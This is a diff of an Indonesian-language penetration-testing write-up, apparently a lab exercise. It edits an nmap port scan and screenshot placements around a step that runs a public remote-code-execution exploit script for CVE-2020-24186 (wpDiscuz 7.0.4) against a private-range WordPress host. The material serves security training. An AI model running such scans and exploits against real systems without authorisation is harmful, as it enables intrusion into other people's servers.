@@ -27,7 +27,7 @@ Vulnerable FTP:
 Pindai server untuk menemukan port yang terbuka:
 
 ```bash
-nmap -p- 10.15.42.245
+nmap -p 21,22,80,443 10.15.42.245                                                         
 ```
 ![langkah 1](https://github.com/user-attachments/assets/c1c2c175-0904-42e9-ad4e-10f43bda4e87)
 
@@ -111,13 +111,14 @@ cd CVE-2020-24186-wpDiscuz-7.0.4-RCE
 ```bash
 sudo python3 wpDiscuz_RemoteCodeExec.py -u http://10.15.42.245:487 -p /2024/10/03/trial/
 ```
+![langkah 9](https://github.com/user-attachments/assets/42e42452-3951-4645-b4fe-8b848ad104e1)
 
 Tampilkan:
 
 ```bash
 ls
 ```
-![langkah 9](https://github.com/user-attachments/assets/42e42452-3951-4645-b4fe-8b848ad104e1)
+![Screenshot 2024-10-07 080334](https://github.com/user-attachments/assets/b5dffc1e-da77-41b9-bffc-e02bcf77ebeb)
 
 
 6. Dampak
